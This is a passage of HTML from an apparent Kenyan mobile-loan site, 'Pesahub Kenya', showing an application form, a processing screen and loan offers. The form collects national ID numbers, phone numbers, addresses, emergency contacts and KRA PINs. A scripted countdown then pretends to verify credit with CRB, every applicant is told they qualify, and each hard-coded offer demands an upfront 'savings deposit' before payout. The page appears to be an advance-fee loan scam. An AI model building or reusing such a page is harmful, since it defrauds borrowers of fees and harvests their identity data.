                                <p style="font-size: 0.85rem; color: var(--gray); margin-top: 10px;">First-time borrowers can get up to KES 15,000. This limit increases with good repayment history.</p>
                            </div>
                            <div style="background: var(--light); padding: 15px; border-radius: 12px; cursor: pointer;" onclick="this.classList.toggle('expanded')">
                                <div style="display: flex; justify-content: space-between; align-items: center;">
                                    <h4 style="font-size: 0.95rem;">What are the interest rates?</h4>
                                    <i class="fas fa-chevron-down" style="color: var(--gray);"></i>
                                </div>
                                <p style="font-size: 0.85rem; color: var(--gray); margin-top: 10px;">Interest rates range from 1.5% to 2.1% depending on the loan provider and term.</p>
                            </div>
                            <div style="background: var(--light); padding: 15px; border-radius: 12px; cursor: pointer;" onclick="this.classList.toggle('expanded')">
                                <div style="display: flex; justify-content: space-between; align-items: center;">
                                    <h4 style="font-size: 0.95rem;">What is the savings/fee requirement?</h4>
                                    <i class="fas fa-chevron-down" style="color: var(--gray);"></i>
                                </div>
                                <p style="font-size: 0.85rem; color: var(--gray); margin-top: 10px;">A small refundable savings deposit is required to secure your loan. This is returned after successful repayment.</p>
                            </div>
                        </div>
                    </div>

                    <!-- Loan Provider Images -->
                    <div class="card" style="margin-bottom: 20px;">
                        <h3 class="card-title"><i class="fas fa-handshake"></i> Our Trusted Partners</h3>
                        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px;">
                            <div style="background: var(--light); padding: 20px; border-radius: 12px; text-align: center;">
                                <img src="loan1.png" alt="Loan Partner 1" style="max-width: 100%; height: auto; border-radius: 8px;" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 200 100%22><rect fill=%22%2327ae60%22 width=%22200%22 height=%22100%22 rx=%228%22/><text x=%22100%22 y=%2255%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2216%22 font-family=%22sans-serif%22>Loan Partner</text></svg>'">
                                <p style="font-size: 0.85rem; color: var(--gray); margin-top: 10px;">Quick personal loans for emergencies</p>
                            </div>
                            <div style="background: var(--light); padding: 20px; border-radius: 12px; text-align: center;">
                                <img src="loan2.png" alt="Loan Partner 2" style="max-width: 100%; height: auto; border-radius: 8px;" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 200 100%22><rect fill=%22%232ecc71%22 width=%22200%22 height=%22100%22 rx=%228%22/><text x=%22100%22 y=%2255%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2216%22 font-family=%22sans-serif%22>Loan Partner</text></svg>'">
                                <p style="font-size: 0.85rem; color: var(--gray); margin-top: 10px;">Flexible repayment options available</p>
                            </div>
                        </div>
                    </div>

                    <!-- Quick Links -->
                    <div class="card" style="margin-bottom: 20px;">
                        <h3 class="card-title"><i class="fas fa-link"></i> Quick Links</h3>
                        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px;">
                            <button class="btn btn-outline" onclick="showPage('about')" style="font-size: 0.9rem;"><i class="fas fa-info-circle"></i> About Us</button>
                            <button class="btn btn-outline" onclick="showPage('contact')" style="font-size: 0.9rem;"><i class="fas fa-envelope"></i> Contact Us</button>
                            <button class="btn btn-outline" onclick="showPage('terms')" style="font-size: 0.9rem;"><i class="fas fa-file-contract"></i> Terms</button>
                            <button class="btn btn-outline" onclick="showPage('privacy')" style="font-size: 0.9rem;"><i class="fas fa-shield-alt"></i> Privacy</button>
                        </div>
                    </div>

                    <!-- Footer -->
                    <div style="text-align: center; padding: 20px; color: var(--gray); font-size: 0.85rem;">
                        <p>&copy; 2025 Pesahub Kenya. All rights reserved.</p>
                        <p style="margin-top: 5px;">Licensed digital lender partner</p>
                    </div>
                </div>
            </div>

            <!-- Loan Eligibility Form Page -->
            <div id="page-loan-eligibility" class="page">
                <div style="background: linear-gradient(135deg, var(--primary), var(--primary-dark)); color: white; padding: 20px; text-align: center;">
                    <i class="fas fa-file-alt" style="font-size: 2.5rem; margin-bottom: 10px;"></i>
                    <h2 style="font-size: 1.5rem; margin-bottom: 5px;">Loan Application Form</h2>
                    <p style="opacity: 0.9; font-size: 0.9rem;">Complete all required fields to check your eligibility</p>
                </div>
                <div class="page-content" style="padding-top: 20px;">
                    <form id="loanEligibilityForm">
                        <!-- Section 1: Personal Information -->
                        <div class="card" style="margin-bottom: 15px;">
                            <h3 class="card-title"><i class="fas fa-user"></i> 1. Personal Information</h3>
                            
                            <div class="form-group">
                                <label class="form-label"><i class="fas fa-user-tag"></i> Full Name (as per ID) *</label>
                                <input type="text" class="form-input" id="loanFullName" placeholder="Enter your full name" required oninput="validateLoanName(this)">
                                <p class="loan-error" id="loanNameError" style="display: none; color: var(--danger); font-size: 0.8rem; margin-top: 5px;">Name must have at least 2 words</p>
                            </div>

                            <div class="form-group">
                                <label class="form-label"><i class="fas fa-id-card"></i> National ID Number *</label>
                                <input type="text" class="form-input" id="loanIdNumber" placeholder="e.g., 12345678" maxlength="9" required oninput="validateLoanId(this)">
                                <p class="loan-error" id="loanIdError" style="display: none; color: var(--danger); font-size: 0.8rem; margin-top: 5px;">ID must be 8 or 9 digits</p>
                            </div>

                            <div class="form-group">
                                <label class="form-label"><i class="fas fa-calendar-alt"></i> Date of Birth *</label>
                                <input type="date" class="form-input" id="loanDob" required onchange="validateLoanDob(this)">
                                <p class="loan-error" id="loanDobError" style="display: none; color: var(--danger); font-size: 0.8rem; margin-top: 5px;">You must be 18 years or older</p>
                            </div>

                            <div class="form-group">
                                <label class="form-label"><i class="fas fa-venus-mars"></i> Gender *</label>
                                <select class="form-input" id="loanGender" required>
                                    <option value="">Select Gender</option>
                                    <option value="male">Male</option>
                                    <option value="female">Female</option>
                                    <option value="other">Other</option>
                                </select>
                            </div>

                            <div class="form-group">
                                <label class="form-label"><i class="fas fa-ring"></i> Marital Status *</label>
                                <select class="form-input" id="loanMarital" required>
                                    <option value="">Select Status</option>
                                    <option value="single">Single</option>
                                    <option value="married">Married</option>
                                    <option value="divorced">Divorced</option>
                                    <option value="widowed">Widowed</option>
                                </select>
                            </div>

                            <div class="form-group">
                                <label class="form-label"><i class="fas fa-phone"></i> Phone Number *</label>
                                <div class="phone-wrapper">
                                    <span class="phone-prefix">+254</span>
                                    <input type="tel" class="form-input" id="loanPhone" placeholder="7XXXXXXXX or 1XXXXXXXX" maxlength="9" required oninput="validateLoanPhone(this)">
                                </div>
                                <p class="loan-error" id="loanPhoneError" style="display: none; color: var(--danger); font-size: 0.8rem; margin-top: 5px;">Enter a valid 9-digit Kenyan phone number</p>
                            </div>

                            <div class="form-group">
                                <label class="form-label"><i class="fas fa-map-marker-alt"></i> County *</label>
                                <select class="form-input" id="loanCounty" required onchange="updateLoanTowns()">
                                    <option value="">Select County</option>
                                    <option value="nairobi">Nairobi</option>
                                    <option value="mombasa">Mombasa</option>
                                    <option value="kisumu">Kisumu</option>
                                    <option value="nakuru">Nakuru</option>
                                    <option value="eldoret">Uasin Gishu</option>
                                    <option value="kiambu">Kiambu</option>
                                    <option value="machakos">Machakos</option>
                                    <option value="kajiado">Kajiado</option>
                                    <option value="nyeri">Nyeri</option>
                                    <option value="meru">Meru</option>
                                    <option value="kakamega">Kakamega</option>
                                    <option value="kilifi">Kilifi</option>
                                    <option value="bungoma">Bungoma</option>
                                    <option value="turkana">Turkana</option>
                                    <option value="nyandarua">Nyandarua</option>
                                    <option value="muranga">Murang'a</option>
                                    <option value="embu">Embu</option>
                                    <option value="trans_nzoia">Trans Nzoia</option>
                                    <option value="kericho">Kericho</option>
                                    <option value="bomet">Bomet</option>
                                    <option value="kisii">Kisii</option>
                                    <option value="narok">Narok</option>
                                    <option value="migori">Migori</option>
                                    <option value="homabay">Homa Bay</option>
                                    <option value="siaya">Siaya</option>
                                    <option value="nandi">Nandi</option>
                                    <option value="baringo">Baringo</option>
                                    <option value="laikipia">Laikipia</option>
                                    <option value="samburu">Samburu</option>
                                    <option value="westpokot">West Pokot</option>
                                    <option value="kitui">Kitui</option>
                                    <option value="makueni">Makueni</option>
                                    <option value="kwale">Kwale</option>
                                    <option value="taita_taveta">Taita Taveta</option>
                                    <option value="tana_river">Tana River</option>
                                    <option value="lamu">Lamu</option>
                                    <option value="garissa">Garissa</option>
                                    <option value="wajir">Wajir</option>
                                    <option value="mandera">Mandera</option>
                                    <option value="marsabit">Marsabit</option>
                                    <option value="isiolo">Isiolo</option>
                                    <option value="tharaka_nithi">Tharaka Nithi</option>
                                    <option value="kirinyaga">Kirinyaga</option>
                                    <option value="vihiga">Vihiga</option>
                                    <option value="busia">Busia</option>
                                    <option value="elgeyo_marakwet">Elgeyo Marakwet</option>
                                    <option value="nyamira">Nyamira</option>
                                </select>
                            </div>

                            <div class="form-group">
                                <label class="form-label"><i class="fas fa-city"></i> Town/Area</label>
                                <select class="form-input" id="loanTown">
                                    <option value="">Select Town (Optional)</option>
                                </select>
                            </div>

                            <div class="form-group">
                                <label class="form-label"><i class="fas fa-home"></i> Physical Address *</label>
                                <input type="text" class="form-input" id="loanAddress" placeholder="Enter your physical address" required>
                            </div>

                            <div class="form-group">
                                <label class="form-label"><i class="fas fa-envelope"></i> Email Address</label>
                                <input type="email" class="form-input" id="loanEmail" readonly style="background: var(--light); cursor: not-allowed;">
                                <p style="font-size: 0.8rem; color: var(--gray); margin-top: 5px;"><i class="fas fa-lock"></i> Email from your registered account</p>
                            </div>
                        </div>

                        <!-- Section 2: Emergency Contacts -->
                        <div class="card" style="margin-bottom: 15px;">
                            <h3 class="card-title"><i class="fas fa-users"></i> 2. Emergency Contacts</h3>
                            
                            <div style="background: var(--light); padding: 15px; border-radius: 12px; margin-bottom: 15px;">
                                <h4 style="font-size: 0.95rem; margin-bottom: 10px;"><i class="fas fa-user-friends"></i> Contact 1 *</h4>
                                <div class="form-group">
                                    <label class="form-label">Contact Name *</label>
                                    <input type="text" class="form-input" id="emergency1Name" placeholder="Full name" required>
                                </div>
                                <div class="form-group">
                                    <label class="form-label">Relationship *</label>
                                    <select class="form-input" id="emergency1Relationship" required>
                                        <option value="">Select Relationship</option>
                                        <option value="spouse">Spouse</option>
                                        <option value="parent">Parent</option>
                                        <option value="sibling">Sibling</option>
                                        <option value="friend">Friend</option>
                                    </select>
                                </div>
                                <div class="form-group" style="margin-bottom: 0;">
                                    <label class="form-label">Phone Number *</label>
                                    <div class="phone-wrapper">
                                        <span class="phone-prefix">+254</span>
                                        <input type="tel" class="form-input" id="emergency1Phone" placeholder="7XXXXXXXX" maxlength="9" required>
                                    </div>
                                </div>
                            </div>

                            <div style="background: var(--light); padding: 15px; border-radius: 12px;">
                                <h4 style="font-size: 0.95rem; margin-bottom: 10px;"><i class="fas fa-user-friends"></i> Contact 2 *</h4>
                                <div class="form-group">
                                    <label class="form-label">Contact Name *</label>
                                    <input type="text" class="form-input" id="emergency2Name" placeholder="Full name" required>
                                </div>
                                <div class="form-group">
                                    <label class="form-label">Relationship *</label>
                                    <select class="form-input" id="emergency2Relationship" required>
                                        <option value="">Select Relationship</option>
                                        <option value="spouse">Spouse</option>
                                        <option value="parent">Parent</option>
                                        <option value="sibling">Sibling</option>
                                        <option value="friend">Friend</option>
                                    </select>
                                </div>
                                <div class="form-group" style="margin-bottom: 0;">
                                    <label class="form-label">Phone Number *</label>
                                    <div class="phone-wrapper">
                                        <span class="phone-prefix">+254</span>
                                        <input type="tel" class="form-input" id="emergency2Phone" placeholder="7XXXXXXXX" maxlength="9" required>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Section 3: Employment & Financial -->
                        <div class="card" style="margin-bottom: 15px;">
                            <h3 class="card-title"><i class="fas fa-briefcase"></i> 3. Employment & Financial Information</h3>
                            
                            <div class="form-group">
                                <label class="form-label"><i class="fas fa-user-tie"></i> Employment Status *</label>
                                <select class="form-input" id="loanEmployment" required>
                                    <option value="">Select Status</option>
                                    <option value="employed">Employed</option>
                                    <option value="self-employed">Self-Employed</option>
                                    <option value="business">Business Owner</option>
                                    <option value="student">Student</option>
                                    <option value="unemployed">Unemployed</option>
                                </select>
                            </div>

                            <div class="form-group">
                                <label class="form-label"><i class="fas fa-money-bill-wave"></i> Monthly Income (KES) *</label>
                                <select class="form-input" id="loanIncome" required>
                                    <option value="">Select Income Range</option>
                                    <option value="0-10000">Below KES 10,000</option>
                                    <option value="10000-30000">KES 10,000 - 30,000</option>
                                    <option value="30000-50000">KES 30,000 - 50,000</option>
                                    <option value="50000-100000">KES 50,000 - 100,000</option>
                                    <option value="100000+">Above KES 100,000</option>
                                </select>
                            </div>

                            <div class="form-group">
                                <label class="form-label"><i class="fas fa-building"></i> Employer/Business Name *</label>
                                <input type="text" class="form-input" id="loanEmployer" placeholder="Enter employer or business name" required>
                            </div>

                            <div class="form-group">
                                <label class="form-label"><i class="fas fa-file-invoice"></i> KRA PIN (Optional)</label>
                                <input type="text" class="form-input" id="loanKraPin" placeholder="e.g., A123456789B">
                            </div>

                            <div class="form-group">
                                <label class="form-label"><i class="fas fa-bullseye"></i> Loan Purpose *</label>
                                <select class="form-input" id="loanPurpose" required>
                                    <option value="">Select Purpose</option>
                                    <option value="emergency">Emergency</option>
                                    <option value="business">Business</option>
                                    <option value="education">Education</option>
                                    <option value="medical">Medical</option>
                                    <option value="personal">Personal</option>
                                    <option value="rent">Rent/Bills</option>
                                    <option value="other">Other</option>
                                </select>
                            </div>

                            <div class="form-group">
                                <label class="form-label"><i class="fas fa-question-circle"></i> Do you have any existing loan? *</label>
                                <select class="form-input" id="loanExisting" required>
                                    <option value="">Select Answer</option>
                                    <option value="no">No, I don't have any loan</option>
                                    <option value="yes_repaying">Yes, but I'm repaying on time</option>
                                    <option value="yes_defaulted">Yes, but I have defaulted</option>
                                    <option value="yes_cleared">Yes, but I have cleared it</option>
                                </select>
                            </div>
                        </div>

                        <!-- Section 4: Terms Acceptance -->
                        <div class="card" style="margin-bottom: 20px;">
                            <h3 class="card-title"><i class="fas fa-check-double"></i> 4. Terms Acceptance</h3>
                            
                            <div style="display: flex; align-items: flex-start; gap: 10px; margin-bottom: 15px;">
                                <input type="checkbox" id="loanTermsAccept" style="width: 20px; height: 20px; margin-top: 3px;" required>
                                <label for="loanTermsAccept" style="font-size: 0.9rem; color: var(--dark);">I confirm that all information provided is accurate and I agree to the <a href="#" onclick="showPage('terms'); return false;" style="color: var(--primary);">Terms and Conditions</a></label>
                            </div>
                            
                            <div style="display: flex; align-items: flex-start; gap: 10px;">
                                <input type="checkbox" id="loanPrivacyAccept" style="width: 20px; height: 20px; margin-top: 3px;" required>
                                <label for="loanPrivacyAccept" style="font-size: 0.9rem; color: var(--dark);">I consent to the processing of my personal data as described in the <a href="#" onclick="showPage('privacy'); return false;" style="color: var(--primary);">Privacy Policy</a></label>
                            </div>
                        </div>

                        <div class="btn-group">
                            <button type="submit" class="btn btn-primary" id="submitLoanBtn">
                                <i class="fas fa-paper-plane"></i> Submit Application
                            </button>
                            <button type="button" class="btn btn-outline" onclick="showPage('loan-dashboard')">
                                <i class="fas fa-arrow-left"></i> Back to Loan Dashboard
                            </button>
                        </div>
                    </form>
                </div>
            </div>

            <!-- Loan Processing Page -->
            <div id="page-loan-processing" class="page">
                <div style="min-height: calc(100vh - 70px); display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px 20px; text-align: center; background: linear-gradient(180deg, var(--light) 0%, #e8f5e9 100%);">
                    <!-- Animated Processing Icon -->
                    <div style="position: relative; width: 120px; height: 120px; margin-bottom: 30px;">
                        <div style="width: 120px; height: 120px; border: 5px solid rgba(39, 174, 96, 0.2); border-top-color: var(--success); border-radius: 50%; animation: spin 1s linear infinite;"></div>
                        <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);">
                            <i class="fas fa-search-dollar" style="font-size: 2.5rem; color: var(--success); animation: pulse 1.5s ease-in-out infinite;"></i>
                        </div>
                    </div>
                    
                    <h2 style="font-size: 1.6rem; color: var(--primary); margin-bottom: 10px; font-weight: 700;">Processing Your Application</h2>
                    <p style="color: var(--gray); margin-bottom: 30px; font-size: 1rem;">Connecting to partner lenders...</p>
                    
                    <!-- System Status Card -->
                    <div style="width: 100%; max-width: 400px; background: var(--white); border-radius: 16px; padding: 25px; margin-bottom: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.1);">
                        <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid var(--border);">
                            <span class="live-indicator" style="background: var(--success);"></span>
                            <span style="font-size: 0.85rem; color: var(--success); font-weight: 600;">SYSTEM LIVE</span>
                        </div>
                        <div id="loanProcessingSteps">
                            <div class="processing-step" style="display: flex; align-items: center; gap: 12px; margin-bottom: 18px; padding: 10px; background: rgba(39, 174, 96, 0.1); border-radius: 10px;">
                                <i class="fas fa-check-circle" style="color: var(--success); font-size: 1.3rem;"></i>
                                <span style="font-size: 0.95rem; font-weight: 500;">Validating personal information...</span>
                            </div>
                            <div class="processing-step" style="display: flex; align-items: center; gap: 12px; margin-bottom: 18px; padding: 10px; background: rgba(26, 95, 42, 0.1); border-radius: 10px;">
                                <i class="fas fa-spinner fa-spin" style="color: var(--primary); font-size: 1.3rem;"></i>
                                <span style="font-size: 0.95rem; font-weight: 500;">Verifying identity with CRB...</span>
                            </div>
                            <div class="processing-step" style="display: flex; align-items: center; gap: 12px; margin-bottom: 18px; padding: 10px; border-radius: 10px; opacity: 0.5;">
                                <i class="fas fa-circle" style="color: var(--gray); font-size: 1.3rem;"></i>
                                <span style="font-size: 0.95rem;">Checking credit eligibility...</span>
                            </div>
                            <div class="processing-step" style="display: flex; align-items: center; gap: 12px; margin-bottom: 18px; padding: 10px; border-radius: 10px; opacity: 0.5;">
                                <i class="fas fa-circle" style="color: var(--gray); font-size: 1.3rem;"></i>
                                <span style="font-size: 0.95rem;">Contacting partner lenders...</span>
                            </div>
                            <div class="processing-step" style="display: flex; align-items: center; gap: 12px; padding: 10px; border-radius: 10px; opacity: 0.5;">
                                <i class="fas fa-circle" style="color: var(--gray); font-size: 1.3rem;"></i>
                                <span style="font-size: 0.95rem;">Preparing loan offers...</span>
                            </div>
                        </div>
                    </div>

                    <!-- Timer Badge -->
                    <div style="background: linear-gradient(135deg, var(--success), #2ecc71); color: white; padding: 18px 40px; border-radius: 50px; font-size: 1.3rem; font-weight: 700; box-shadow: 0 8px 25px rgba(39, 174, 96, 0.4);">
                        <i class="fas fa-hourglass-half" style="margin-right: 10px; animation: pulse 1s ease-in-out infinite;"></i>
                        <span id="loanProcessingTimer">20</span> seconds
                    </div>
                    
                    <div style="margin-top: 25px; padding: 15px 20px; background: rgba(39, 174, 96, 0.1); border-radius: 12px;">
                        <p style="font-size: 0.9rem; color: var(--primary);"><i class="fas fa-shield-alt" style="margin-right: 8px;"></i> Your data is encrypted and secure</p>
                    </div>
                </div>
            </div>

            <!-- Loan Offers Loading Page -->
            <div id="page-loan-offers-loading" class="page">
                <div style="min-height: calc(100vh - 70px); display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px 20px; text-align: center; background: linear-gradient(180deg, #e8f5e9 0%, var(--light) 100%);">
                    <div style="width: 80px; height: 80px; border: 4px solid rgba(39, 174, 96, 0.2); border-top-color: var(--success); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 30px;"></div>
                    <h2 style="font-size: 1.4rem; color: var(--primary); margin-bottom: 10px;">Generating Loan Offers</h2>
                    <p style="color: var(--gray);">Please wait...</p>
                </div>
            </div>

            <!-- Loan Offers Page -->
            <div id="page-loan-offers" class="page">
                <div style="background: linear-gradient(135deg, var(--success), #27ae60); color: white; padding: 30px 20px; text-align: center; position: relative; overflow: hidden;">
                    <img src="congrats.png" alt="" style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; width: 100%; height: 100%; object-fit: cover; opacity: 0.15;" onerror="this.style.display='none'">
                    <div style="position: relative; z-index: 1;">
                        <i class="fas fa-trophy" style="font-size: 3.5rem; margin-bottom: 15px; animation: pulse 2s ease-in-out infinite;"></i>
                        <h2 style="font-size: 1.8rem; margin-bottom: 10px; font-weight: 700;">Congratulations!</h2>
                        <p style="opacity: 0.95; font-size: 1.05rem;">You qualify for the following loan offers</p>
                    </div>
                </div>
                
                <div class="page-content" style="padding-top: 20px;">
                    <!-- Applicant Info Card -->
                    <div class="card" style="margin-bottom: 20px; background: linear-gradient(135deg, rgba(39, 174, 96, 0.1), rgba(46, 204, 113, 0.05)); border: 2px solid rgba(39, 174, 96, 0.2);">
                        <div style="display: flex; align-items: center; gap: 15px;">
                            <img src="loan-avatar.png" alt="User" style="width: 65px; height: 65px; border-radius: 50%; object-fit: cover; border: 3px solid var(--success);" onerror="this.outerHTML='<div style=\\'width: 65px; height: 65px; background: linear-gradient(135deg, var(--success), #2ecc71); border-radius: 50%; display: flex; align-items: center; justify-content: center;\\'><i class=\\'fas fa-user-check\\' style=\\'font-size: 1.5rem; color: white;\\'></i></div>'">
                            <div>
                                <h4 id="loanOfferName" style="font-size: 1.15rem; font-weight: 600;">-</h4>
                                <p style="font-size: 0.85rem; color: var(--gray);">ID: <span id="loanOfferId">-</span></p>
                                <p style="font-size: 0.85rem; color: var(--gray);">Phone: <span id="loanOfferPhone">-</span></p>
                            </div>
                        </div>
                    </div>

                    <!-- Loan Offer Cards -->
                    <div id="loanOfferCards" style="display: grid; gap: 20px;">
                        <!-- Linker Mkopo -->
                        <div class="card loan-offer-card" style="border: 3px solid #3498db; transition: all 0.3s; animation: cardFloat1 3s ease-in-out infinite; background: linear-gradient(135deg, rgba(52, 152, 219, 0.05), rgba(255,255,255,1));">
                            <style>
                                @keyframes cardFloat1 { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
                                @keyframes cardFloat2 { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-6px); } }
                                @keyframes cardFloat3 { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-4px); } }
                            </style>
                            <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 15px;">
                                <img src="linker-logo.png" alt="Linker Mkopo" style="width: 60px; height: 60px; border-radius: 12px; object-fit: cover; border: 2px solid #3498db;" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 60 60%22><rect fill=%22%233498db%22 width=%2260%22 height=%2260%22 rx=%2212%22/><text x=%2230%22 y=%2235%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2210%22 font-family=%22sans-serif%22>LM</text></svg>'">
                                <div>
                                    <h4 style="font-size: 1.1rem; color: var(--primary);">Linker Mkopo</h4>
                                    <p style="font-size: 0.85rem; color: var(--gray);">Quick Personal Loans</p>
                                </div>
                            </div>
                            <div style="text-align: center; background: var(--light); padding: 20px; border-radius: 12px; margin-bottom: 15px;">
                                <h3 style="font-size: 2rem; color: var(--success);">KES 4,000</h3>
                                <p style="font-size: 0.9rem; color: var(--gray);">Receive KES 3,870 to your M-Pesa</p>
                            </div>
                            <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 15px;">
                                <div style="text-align: center; padding: 10px; background: var(--light); border-radius: 8px;">
                                    <p style="font-size: 0.75rem; color: var(--gray);">Savings Required</p>
                                    <p style="font-weight: 600; color: var(--warning);">KES 130</p>
                                </div>
                                <div style="text-align: center; padding: 10px; background: var(--light); border-radius: 8px;">
                                    <p style="font-size: 0.75rem; color: var(--gray);">Repayment</p>
                                    <p style="font-weight: 600;">KES 4,070</p>
                                </div>
                                <div style="text-align: center; padding: 10px; background: var(--light); border-radius: 8px;">
                                    <p style="font-size: 0.75rem; color: var(--gray);">Duration</p>
                                    <p style="font-weight: 600;">60 Days</p>
                                </div>
                                <div style="text-align: center; padding: 10px; background: var(--light); border-radius: 8px;">
                                    <p style="font-size: 0.75rem; color: var(--gray);">Interest</p>
                                    <p style="font-weight: 600; color: var(--success);">1.75%</p>
                                </div>
                            </div>
                            <button class="btn btn-primary" onclick="selectLoanOffer('linker', 4000, 130, 3870, 4070, 60, 1.75)">
                                <i class="fas fa-check"></i> Select This Offer
                            </button>
                        </div>

                        <!-- Pesa Haraka -->
                        <div class="card loan-offer-card" style="border: 3px solid #e74c3c; transition: all 0.3s; animation: cardFloat2 3.5s ease-in-out infinite; background: linear-gradient(135deg, rgba(231, 76, 60, 0.05), rgba(255,255,255,1));">
                            <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 15px;">
                                <img src="pesa-logo.png" alt="Pesa Haraka" style="width: 60px; height: 60px; border-radius: 12px; object-fit: cover; border: 2px solid #e74c3c;" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 60 60%22><rect fill=%22%23e74c3c%22 width=%2260%22 height=%2260%22 rx=%2212%22/><text x=%2230%22 y=%2235%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2210%22 font-family=%22sans-serif%22>PH</text></svg>'">
                                <div>
                                    <h4 style="font-size: 1.1rem; color: var(--primary);">Pesa Haraka</h4>
                                    <p style="font-size: 0.85rem; color: var(--gray);">Instant Cash Loans</p>
                                </div>
                            </div>
                            <div style="text-align: center; background: var(--light); padding: 20px; border-radius: 12px; margin-bottom: 15px;">
                                <h3 style="font-size: 2rem; color: var(--success);">KES 7,000</h3>
                                <p style="font-size: 0.9rem; color: var(--gray);">Receive KES 6,770 to your M-Pesa</p>
                            </div>
                            <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 15px;">
                                <div style="text-align: center; padding: 10px; background: var(--light); border-radius: 8px;">
                                    <p style="font-size: 0.75rem; color: var(--gray);">Savings Required</p>
                                    <p style="font-weight: 600; color: var(--warning);">KES 230</p>
                                </div>
                                <div style="text-align: center; padding: 10px; background: var(--light); border-radius: 8px;">
                                    <p style="font-size: 0.75rem; color: var(--gray);">Repayment</p>
                                    <p style="font-weight: 600;">KES 7,147</p>
                                </div>
                                <div style="text-align: center; padding: 10px; background: var(--light); border-radius: 8px;">
                                    <p style="font-size: 0.75rem; color: var(--gray);">Duration</p>
                                    <p style="font-weight: 600;">70 Days</p>
                                </div>
                                <div style="text-align: center; padding: 10px; background: var(--light); border-radius: 8px;">
                                    <p style="font-size: 0.75rem; color: var(--gray);">Interest</p>
                                    <p style="font-weight: 600; color: var(--success);">2.1%</p>
                                </div>
                            </div>
                            <button class="btn btn-primary" onclick="selectLoanOffer('pesa', 7000, 230, 6770, 7147, 70, 2.1)">
                                <i class="fas fa-check"></i> Select This Offer
                            </button>
                        </div>

                        <!-- Mkopo Sasa -->
                        <div class="card loan-offer-card" style="border: 3px solid var(--success); background: linear-gradient(135deg, rgba(39, 174, 96, 0.08), rgba(46, 204, 113, 0.03)); transition: all 0.3s; animation: cardFloat3 2.5s ease-in-out infinite; position: relative;">
                            <div style="position: absolute; top: 10px; right: 10px; background: linear-gradient(135deg, var(--success), #2ecc71); color: white; padding: 6px 14px; border-radius: 20px; font-size: 0.75rem; font-weight: 700; box-shadow: 0 3px 10px rgba(39,174,96,0.3);">BEST VALUE</div>
                            <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 15px;">
                                <img src="mkopo-logo.png" alt="Mkopo Sasa" style="width: 60px; height: 60px; border-radius: 12px; object-fit: cover; border: 2px solid var(--success);" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 60 60%22><rect fill=%22%2327ae60%22 width=%2260%22 height=%2260%22 rx=%2212%22/><text x=%2230%22 y=%2235%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2210%22 font-family=%22sans-serif%22>MS</text></svg>'">
                                <div>
                                    <h4 style="font-size: 1.1rem; color: var(--primary);">Mkopo Sasa</h4>
                                    <p style="font-size: 0.85rem; color: var(--gray);">Premium Loans</p>
                                </div>
                            </div>
                            <div style="text-align: center; background: linear-gradient(135deg, var(--success), #2ecc71); color: white; padding: 20px; border-radius: 12px; margin-bottom: 15px;">
                                <h3 style="font-size: 2rem;">KES 15,000</h3>
                                <p style="font-size: 0.9rem; opacity: 0.9;">Receive KES 14,570 to your M-Pesa</p>
                            </div>
                            <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 15px;">
                                <div style="text-align: center; padding: 10px; background: var(--light); border-radius: 8px;">
                                    <p style="font-size: 0.75rem; color: var(--gray);">Savings Required</p>
                                    <p style="font-weight: 600; color: var(--warning);">KES 430</p>
                                </div>
                                <div style="text-align: center; padding: 10px; background: var(--light); border-radius: 8px;">
                                    <p style="font-size: 0.75rem; color: var(--gray);">Repayment</p>
                                    <p style="font-weight: 600;">KES 15,225</p>
                                </div>
                                <div style="text-align: center; padding: 10px; background: var(--light); border-radius: 8px;">
                                    <p style="font-size: 0.75rem; color: var(--gray);">Duration</p>
                                    <p style="font-weight: 600;">100 Days</p>
                                </div>
                                <div style="text-align: center; padding: 10px; background: var(--light); border-radius: 8px;">
                                    <p style="font-size: 0.75rem; color: var(--gray);">Interest</p>
                                    <p style="font-weight: 600; color: var(--success);">1.5%</p>
                                </div>
                            </div>
                            <button class="btn btn-primary" style="background: linear-gradient(135deg, var(--success), #27ae60);" onclick="selectLoanOffer('mkopo', 15000, 430, 14570, 15225, 100, 1.5)">
                                <i class="fas fa-star"></i> Select This Offer
                            </button>
                        </div>
                    </div>

                    <div style="margin-top: 20px; padding: 15px; background: var(--light); border-radius: 12px;">
                        <p style="font-size: 0.85rem; color: var(--gray); text-align: center;"><i class="fas fa-info-circle"></i> All loans are subject to approval. Savings deposits are refundable upon successful loan repayment.After payment the loan is imediately disbursed to your M-pesa account number provided ,delay may take 5-6 minutes depending on the lender chosen</p>
                    </div>
                </div>
            </div>

            <!-- Loan Review Page -->
            <div id="page-loan-review" class="page">
